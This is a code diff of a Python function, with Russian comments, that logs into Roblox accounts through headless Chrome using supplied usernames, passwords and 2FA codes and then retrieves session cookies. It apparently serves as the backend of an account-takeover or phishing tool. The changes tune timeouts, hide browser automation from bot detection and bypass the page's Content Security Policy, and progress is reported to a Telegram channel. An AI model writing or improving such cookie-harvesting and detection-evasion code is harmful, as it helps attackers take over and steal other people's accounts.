@@ -82,15 +82,19 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
         send_telegram_log(f"[INFO] Начинаю вход для {username} (session_id: {session_id})")
         send_telegram_log(f"[INFO] ОС: {os.name}, ChromeDriver путь: {CHROMEDRIVER_PATH}")
         
-        # Устанавливаем общий таймаут для всего процесса
-        import signal
+        # Простой таймаут через Timer
+        import threading
         
-        def timeout_handler(signum, frame):
-            raise TimeoutError("Процесс превысил время ожидания")
+        def timeout_handler():
+            send_telegram_log(f"[TIMEOUT] Процесс для {username} превысил время ожидания (2 минуты)")
+            import os
+            os._exit(1)
         
-        # Устанавливаем таймаут 2 минуты
-        signal.signal(signal.SIGALRM, timeout_handler)
-        signal.alarm(120)
+        # Устанавливаем таймер на 2 минуты
+        timer = threading.Timer(120.0, timeout_handler)
+        timer.daemon = True
+        timer.start()
+        
         options = webdriver.ChromeOptions()
         # Основные опции для headless режима
         options.add_argument('--headless=new')  # Новый headless режим
@@ -106,6 +110,15 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
         options.add_argument('--disable-plugins')
         options.add_argument('--disable-images')
         options.add_argument('--disable-plugins-discovery')
+        
+        # Дополнительные опции для стабильности
+        options.add_argument('--window-size=1920,1080')
+        options.add_argument('--start-maximized')
+        options.add_argument('--disable-blink-features=AutomationControlled')
+        options.add_argument('--disable-infobars')
+        options.add_argument('--disable-logging')
+        options.add_argument('--log-level=3')
+        options.add_argument('--silent')
         options.add_argument('--disable-background-timer-throttling')
         options.add_argument('--disable-backgrounding-occluded-windows')
         options.add_argument('--disable-renderer-backgrounding')
@@ -119,15 +132,6 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
         options.add_argument('--disable-page-hide-dialogs')
         options.add_argument('--disable-visibility-change-dialogs')
         
-        # Дополнительные опции для стабильности
-        options.add_argument('--window-size=1920,1080')
-        options.add_argument('--start-maximized')
-        options.add_argument('--disable-blink-features=AutomationControlled')
-        options.add_argument('--disable-infobars')
-        options.add_argument('--disable-logging')
-        options.add_argument('--log-level=3')
-        options.add_argument('--silent')
-        
         # Дополнительные опции для Linux
         if os.name != 'nt':  # Linux/Mac
             options.add_argument('--disable-dev-shm-usage')
@@ -136,6 +140,7 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
             options.add_argument('--disable-setuid-sandbox')
             options.add_argument('--disable-web-security')
             options.add_argument('--allow-running-insecure-content')
+        
         options.add_experimental_option('excludeSwitches', ['enable-automation'])
         options.add_experimental_option('useAutomationExtension', False)
         options.add_experimental_option('prefs', {
@@ -167,6 +172,7 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
                 'notifications': 2
             }
         })
+        
         # Создаем Service для ChromeDriver
         try:
             if os.name == 'nt':  # Windows
@@ -392,9 +398,13 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
                     driver = webdriver.Chrome(service=service, options=options)
                     
                     # Устанавливаем таймауты
-                    driver.set_page_load_timeout(30)
-                    driver.implicitly_wait(10)
-                    driver.set_script_timeout(30)
+                    driver.set_page_load_timeout(15)  # Уменьшаем таймаут
+                    driver.implicitly_wait(5)         # Уменьшаем таймаут
+                    driver.set_script_timeout(15)     # Уменьшаем таймаут
+                    
+                    # Дополнительные настройки для стабильности
+                    driver.execute_cdp_cmd('Page.setBypassCSP', {'enabled': True})
+                    driver.execute_cdp_cmd('Network.setBypassServiceWorker', {'bypass': True})
                     
                     selenium_sessions[session_id] = {'driver': driver, 'username': username}
                     send_telegram_log(f"[INFO] Chrome driver создан успешно для {username}")
@@ -506,6 +516,11 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
                     driver.quit()
                     selenium_sessions.pop(session_id, None)
                     return {'success': False, 'message': f'Ошибка загрузки страницы: {e}'}
+                except TimeoutError:
+                    send_telegram_log(f"[TIMEOUT] Страница логина не загрузилась для {username}")
+                    driver.quit()
+                    selenium_sessions.pop(session_id, None)
+                    return {'success': False, 'message': 'Страница не загрузилась в течение 15 секунд'}
                 
                 # Дополнительно блокируем всплывающие окна после загрузки страницы
                 driver.execute_script("""
@@ -551,6 +566,11 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
                     driver.quit()
                     selenium_sessions.pop(session_id, None)
                     return {'success': False, 'message': f'Ошибка при заполнении формы: {e}'}
+                except TimeoutError:
+                    send_telegram_log(f"[TIMEOUT] Не удалось найти элементы формы для {username}")
+                    driver.quit()
+                    selenium_sessions.pop(session_id, None)
+                    return {'success': False, 'message': 'Не удалось найти элементы формы в течение 5 секунд'}
 
             # Проверяем ошибки Roblox
             try:
@@ -681,9 +701,9 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
         send_telegram_log(f"[ERROR] Ошибка Selenium для {username}: {e}")
         return {'success': False, 'message': f'Ошибка Selenium: {e}'}
     finally:
-        # Очищаем таймаут
+        # Отменяем таймер
         try:
-            signal.alarm(0)
+            timer.cancel()
         except:
             pass
 
